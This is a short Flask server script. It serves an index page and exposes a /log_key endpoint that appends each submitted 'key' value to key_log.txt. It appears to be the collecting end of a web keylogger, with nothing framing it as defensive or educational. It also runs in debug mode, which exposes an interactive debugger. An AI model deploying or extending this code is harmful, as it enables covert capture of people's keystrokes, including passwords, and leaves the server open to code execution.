from flask import Flask, render_template, request

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/log_key', methods=['POST'])
def log_key():
    key = request.form.get('key')
    if key:
        with open("key_log.txt", "a") as f:
            f.write(key)
    return '', 204 

if __name__ == '__main__':
    app.run(debug=True)
